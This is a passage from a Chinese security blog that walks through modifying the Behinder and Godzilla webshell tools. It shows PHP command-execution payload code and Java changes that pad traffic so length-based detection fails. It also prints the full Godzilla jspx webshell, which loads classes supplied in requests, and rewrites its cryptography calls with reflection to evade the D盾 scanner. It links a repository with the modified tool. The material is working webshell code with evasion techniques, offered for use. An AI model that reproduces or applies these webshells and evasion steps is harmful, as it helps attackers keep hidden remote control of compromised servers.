<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= fread(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> encrypt(json_encode(<span class="variable">$result</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(getSafeStr(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> encrypt(json_encode(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> @session_start();</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_encrypt(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;Y2QgL3d3dy93d3dyb290L3BocC9yZWJleW9uZC8gO2xz&quot;</span>;<span class="variable">$cmd</span>=base64_decode(<span class="variable">$cmd</span>);<span class="variable">$path</span>=<span class="string">&quot;L3d3dy93d3dyb290L3BocC9yZWJleW9uZC8=&quot;</span>;<span class="variable">$path</span>=base64_decode(<span class="variable">$path</span>);</span><br><span class="line">main(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>就会得到一个源码里的模板，和执行命令传的参数，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004420175.png" alt="image-20250702004420175"></p><p>这里cmd解出来就是传递的参数了，因为模板是确定的，那么他的传递的值大小就是确定的，这里因为我们执行的命令不一样，可能不一样，为什么呢，因为我们常常执行的命令都很短，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004840065.png" alt="image-20250702004840065"></p><p>这里可以看到，执行短的命令就是5740左右，执行长的就会相应的加上一些。</p><p>我们这里考虑到如果安全设备标记了这个长度，那就不好了，我们可以在模板中加一些字符串，让这个模板变大一些。首先在net/rebeyond/behinder/core/Params.java<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014110041-17513916703093.png" alt="image-20250702014110041"></p><p>找到相关的代码，因为每次都会加载php，我们刚刚看到的模板也copy出来一份，在net/rebeyond/behinder/core/Params.java中写一个随机位数的字符串，跨度大一些，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String CHAR_POOL = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">int</span> length = random.nextInt(<span class="number">51</span>) + <span class="number">150</span>;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            sb.append(CHAR_POOL.charAt(random.nextInt(CHAR_POOL.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        String randomStr = sb.toString();</span><br></pre></td></tr></table></figure><p>随机150-200字符，太大了也不行，影响传输，慢。</p><p>然后再模板中随意定义一个变量</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014615170.png" alt="image-20250702014615170"></p><p>然后在进行替换一下，就好了。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014634806.png" alt="image-20250702014634806"></p><p>打包编译，看下效果。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702021249763.png" alt="image-20250702021249763"></p><p>可以看到，再执行命令的时候也就可以动态的调整大小了。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702021619775.png" alt="image-20250702021619775"></p><p>相应的，我们再解请求包的时候，也就可以看到这个字符串了。</p><p>这里笔者只是加了cmd.php其他的都没加，因为笔者再测试的时候发现，其他功能的请求字符串大小波动比较大，都没有太固定再一个值范围边，如果需要的话，从新copy一份，加上要替换的字符也就可以了。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705230906068.png" alt="image-20250705230906068"></p><p>顺便在加一下jsp的，</p><p>需要在net/rebeyond/behinder/core/Params.java的</p><p><code>public static byte[] getTransProtocoledClass(String className, TransProtocol transProtocol) throws Exception &#123;</code></p><p>修改，用到class修改，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getTransProtocoledClass(String className, TransProtocol transProtocol) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String transProtocolName = transProtocol.getName();</span><br><span class="line">        <span class="keyword">if</span> (transProtocol.getId() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            String key = ((LegacyCryptor)transProtocol.getCryptor()).getKey();</span><br><span class="line">            <span class="keyword">if</span> (legacyPayloadClassCache.containsKey(transProtocolName) &amp;&amp; legacyPayloadClassCache.get(transProtocolName).containsKey(key) &amp;&amp; legacyPayloadClassCache.get(transProtocolName).get(key).containsKey(className)) &#123;</span><br><span class="line">                <span class="keyword">return</span> legacyPayloadClassCache.get(transProtocolName).get(key).get(className).toBytecode();</span><br><span class="line">            &#125;</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();</span><br><span class="line">            CtClass PocCls = cp.getAndRename(String.format(<span class="string">&quot;net.rebeyond.behinder.payload.java.%s&quot;</span>, className), Utils.getRandomString(<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//java</span></span><br><span class="line">            <span class="comment">// === 插入随机字段 ===</span></span><br><span class="line">            String chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="keyword">int</span> length = <span class="number">150</span> + random.nextInt(<span class="number">1500</span>);</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                sb.append(chars.charAt(random.nextInt(chars.length())));</span><br><span class="line">            &#125;</span><br><span class="line">            String randomValue = sb.toString();</span><br><span class="line">            String fieldName = <span class="string">&quot;bohemian_&quot;</span> + random.nextInt(<span class="number">9999</span>);</span><br><span class="line">            String fieldSrc = <span class="string">&quot;private static final String &quot;</span> + fieldName + <span class="string">&quot; = \&quot;&quot;</span> + randomValue + <span class="string">&quot;\&quot;;&quot;</span>;</span><br><span class="line">            CtField junkField = CtField.make(fieldSrc, PocCls);</span><br><span class="line">            PocCls.addField(junkField);</span><br><span class="line">            <span class="comment">//end</span></span><br><span class="line"></span><br><span class="line">            CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);</span><br><span class="line">            PocCls.removeMethod(PocCls.getDeclaredMethod(<span class="string">&quot;Encrypt&quot;</span>));</span><br><span class="line">            PocCls.addMethod(encodeMethod);</span><br><span class="line">            PocCls.setName(className);</span><br><span class="line">            PocCls.detach();</span><br><span class="line">            Map&lt;String, CtClass&gt; payloadClass = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            payloadClass.put(className, PocCls);</span><br><span class="line">            Map&lt;String, Map&lt;String, CtClass&gt;&gt; keyPayloadMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            keyPayloadMap.put(key, payloadClass);</span><br><span class="line">            legacyPayloadClassCache.put(transProtocolName, keyPayloadMap);</span><br><span class="line">            <span class="keyword">return</span> PocCls.toBytecode();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (payloadClassCache.containsKey(transProtocolName) &amp;&amp; payloadClassCache.get(transProtocolName).containsKey(className)) &#123;</span><br><span class="line">            <span class="keyword">return</span> payloadClassCache.get(transProtocolName).get(className).toBytecode();</span><br><span class="line">        &#125;</span><br><span class="line">        ClassPool cp = ClassPool.getDefault();</span><br><span class="line">        CtClass PocCls = cp.getAndRename(String.format(<span class="string">&quot;net.rebeyond.behinder.payload.java.%s&quot;</span>, className), Utils.getRandomString(<span class="number">10</span>));</span><br><span class="line">        CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);</span><br><span class="line">        PocCls.removeMethod(PocCls.getDeclaredMethod(<span class="string">&quot;Encrypt&quot;</span>));</span><br><span class="line">        PocCls.addMethod(encodeMethod);</span><br><span class="line">        PocCls.setName(className);</span><br><span class="line">        PocCls.detach();</span><br><span class="line">        HashMap&lt;String, CtClass&gt; payloadClass = <span class="keyword">new</span> HashMap&lt;String, CtClass&gt;();</span><br><span class="line">        payloadClass.put(className, PocCls);</span><br><span class="line">        payloadClassCache.put(transProtocolName, payloadClass);</span><br><span class="line">        <span class="keyword">return</span> PocCls.toBytecode();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705231249340.png" alt="image-20250705231249340"></p><p>这样每次用的时候执行命令的时候，就会把数据包随机的扩大一些了。</p><p>Content-length大小的改变就先到这里吧。</p><p>网上还有其他大师傅的文章说，每次客户端请求的时候，客户端的端口号是从<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702025210498.png" alt="image-20250702025210498"></p><p>49700左右开始加的，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702025359673-17513960398604.png" alt="image-20250702025359673"></p><p>笔者在测试的时候似乎没发现这个特征，这里不太清楚是因为木马是3.0的原因还是啥，这里就不过多研究了，等下个文章研究4.0木马的时候，我们再来研究是否有这个特征。</p><p>接下来，我们还是要看一下冰蝎的流量，从以前写的文章中我们知道，在godzilla中</p><p>请求流量php是可以左右加参数的，如 a=s&amp;b=d&amp;pass=balbal，godzilla的木马有两个参数，一个是pass，一个是key，pass是用来传参的，而key是用来异或的，所以pass的值才是server端php所接受的参数，而在Behinder中，php的木马是是用的<code>file_get_contents(&quot;php://input&quot;);</code>来接受所有的传递内容，所以我们在看behinder的流量时，会发现，是没有参数传递的。这个函数file_get_contents(“php://input”)和字符串，后面免杀要重点关注。<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705202555384.png" alt="image-20250705202555384"></p><p>这里如果在加一些 a=s&amp;b=d&amp;pass=balbal，似乎有些不好，不是那么规整了，这里就不在画蛇添足了。当然，如果想加的话，也不是不行，$post=file_get_contents(“php://input”);，直接获取参数的值给post变量即可。<br>下面我们来看，返回包，从以前写的文章中我们知道，godzilla的返回包带有密码和key的md5值，在返回包的前后，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203237843-17517187580431.png" alt="image-20250705203237843"></p><p>也就是这样的，<a href="https://bohemian.top/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/#php">godzilla二开</a>，在前面的文章中可以看到我们在二开哥斯拉的时候，给他修改了一下，让他没那么明显，<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203447624.png" alt="image-20250705203447624"></p><p>也就是这样，让他没那么明显，但是我们回过头来看behinder的返回包</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203604434.png" alt="image-20250705203604434"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204058620.png" alt="image-20250705204058620"></p><p>看起来似乎就是加密的流量，如果不解密出来的话，没有什么明显的特征，如果这里加成那种带message的其实也行，但是感觉没什么必要，加了有点突兀，这里笔者就先不加了。当然如果你想加也是可以的，在net/rebeyond/behinder/core/ShellService.java中，对data数据进行操作就可以了，当然前提是你的木马也要修改，就是echo一下。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204158159.png" alt="image-20250705204158159"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204316386.png" alt="image-20250705204316386"></p><p>也就是说，整体上来看behinder3.0的流量看起来还是挺正常的。目前来看不太需要进行更改。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这里也只是简单的对冰蝎3.0的数据包流量进行一丢丢的修改，看到网上的一些特征做隐去处理，没有做过多的更改</p><h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>下个版本我们将做免杀，我们都知道，哥斯拉是可以直接生成木马的，而冰蝎不能直接生成，是自带的在，在我们下载的时候，<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705231938998.png" alt="image-20250705231938998"></p><p>在server中，这样的话，不是很方便。</p><p>下个版本将新增一个免杀生成按钮，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705232010941.png" alt="image-20250705232010941"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705232203175.png" alt="image-20250705232203175"></p><p>点开后，输入密码生成即可。</p><p>目前框架已写好了，php和asp已经做完免杀了，其他的还需要做一些。很快将会完成。</p><h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a href="https://github.com/Bohemiana/behinder_erkai">https://github.com/Bohemiana/behinder_erkai</a><br>src代码也以上传，免杀已有框架代码，大家直接下载研究即可。</p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。如果您感觉文章写的不错或者工具用起来还行，帮笔者点点stars、给公众号点点关注，先谢谢大家了。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder            原版behinder</span><br></pre></td></tr></table></figure><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 二开 </tag>
            
            <tag> behinder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哥斯拉二开从0到1-6(jspx免杀)</title>
      <link href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/"/>
      <url>/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下jspx流量修改及免杀。</p><h5 id="jspx简介"><a href="#jspx简介" class="headerlink" title="jspx简介"></a>jspx简介</h5><p><strong>JSPX (JavaServer Pages XML)</strong> 是一种基于 XML 语法的 JSP（JavaServer Pages）格式。它将 JSP 与 XML 的严格语法规则结合，确保页面中的所有标签都符合 XML 的结构要求。通过使用 JSPX，开发人员可以得到一个符合 XML 规范的页面，这在某些情况下非常重要，例如处理 XML 数据或需要与其他 XML 系统进行集成时。JSPX 就是 JSP 的 XML 版本，主要区别在于 XML 的严格语法要求。</p><p>看起来是aspx和asmx的关系差不多。就是XML版本的。</p><h5 id="jspx免杀"><a href="#jspx免杀" class="headerlink" title="jspx免杀"></a>jspx免杀</h5><p>我们先来看一下Godzilla的jspx生成原版木马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:root xmlns:jsp=<span class="string">&quot;http://java.sun.com/JSP/Page&quot;</span> version=<span class="string">&quot;1.2&quot;</span>&gt;&lt;jsp:declaration&gt; String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; String pass=<span class="string">&quot;pass&quot;</span>; String md5=md5(pass+xc); <span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;<span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(ClassLoader z)</span></span>&#123;<span class="keyword">super</span>(z);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">Q</span><span class="params">(<span class="keyword">byte</span>[] cb)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="keyword">byte</span>[] x(<span class="keyword">byte</span>[] s,<span class="keyword">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> javax.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="keyword">null</span>; &#125;&#125; <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;String ret = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;<span class="keyword">return</span> ret; &#125; <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception </span>&#123;Class base64;String value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object Encoder = base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125; <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;Class base64;<span class="keyword">byte</span>[] value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object decoder = base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>); Object decoder = base64.newInstance(); value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;<span class="keyword">try</span>&#123;<span class="keyword">byte</span>[] data=base64Decode(request.getParameter(pass));data=x(data, <span class="keyword">false</span>);<span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>)==<span class="keyword">null</span>)&#123;session.setAttribute(<span class="string">&quot;payload&quot;</span>,<span class="keyword">new</span> X(<span class="keyword">this</span>.getClass().getClassLoader()).Q(data));&#125;<span class="keyword">else</span>&#123;request.setAttribute(<span class="string">&quot;parameters&quot;</span>,data);java.io.ByteArrayOutputStream arrOut=<span class="keyword">new</span> java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(<span class="number">0</span>,<span class="number">16</span>));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="keyword">true</span>)));response.getWriter().write(md5.substring(<span class="number">16</span>));&#125; &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure><p>也是非常的长，其中非常长的就是base64的编解码，做了很多判断。</p><p>简单看下代码会发现其实和jsp代码大差不差。几乎一样，除了格式有点偏差，那么我们做免杀就可以照着以前写的文章去修改了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250206152005143.png" alt="image-20250206152005143"></p><p>使用原版的godzilla中，我们会发现，加密器并有jspx的，这里直接使用java的就行，用起来一样。</p><p>简单先用d盾fuzz一下，还是发现aes加密处做了检测，</p><p><code>javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));            return c.doFinal(s);</code></p><p>就是这一句，我们对这个进行简单修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String xo = &quot;javax.crypto.Cipher&quot;;</span><br><span class="line">        Class cl = Class.forName(xo);</span><br><span class="line">        java.lang.reflect.Method g = cl.getMethod(&quot;getInstance&quot;,String.class);</span><br><span class="line">        Object c = cl.cast(g.invoke((null),&quot;AES&quot;));</span><br><span class="line">        cl.getMethod(&quot;init&quot;,int.class,java.security.Key.class).invoke(c,m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));</span><br><span class="line">         java.lang.reflect.Method douyin = cl.getMethod(&quot;doFinal&quot;, byte[].class);</span><br><span class="line">        return (byte[]) douyin.invoke(c, (Object) s);</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250206151832748.png" alt="image-20250206151832748"></p><p>当然，这个时候还是有问题的，就是加载base64编解码那里。文章3免杀的时候已经提到过了，笔者这里直接把jsp的拿过来。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="built_in">String</span> base64Encode(byte[] webray) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.util.Base64.Encoder leadsec = java.util.Base64.getEncoder();</span><br><span class="line">            <span class="keyword">return</span> 